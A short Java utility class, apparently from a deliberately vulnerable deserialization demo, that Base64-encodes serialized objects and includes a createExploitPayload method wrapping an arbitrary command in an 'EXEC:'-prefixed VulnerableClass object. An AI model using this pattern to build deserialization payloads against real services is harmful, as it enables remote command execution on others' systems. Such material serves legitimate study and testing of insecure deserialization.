package com.example.util;

import com.example.VulnerableClass;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class SerializationUtil {
    
    public static String serializeToBase64(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        
        return Base64.getEncoder().encodeToString(bos.toByteArray());
    }
    
    public static String createExploitPayload(String command) throws Exception {
        VulnerableClass exploit = new VulnerableClass("EXEC:" + command);
        return serializeToBase64(exploit);
    }
    
    public static String createSafePayload(String data) throws Exception {
        VulnerableClass safe = new VulnerableClass(data);
        return serializeToBase64(safe);
    }
} 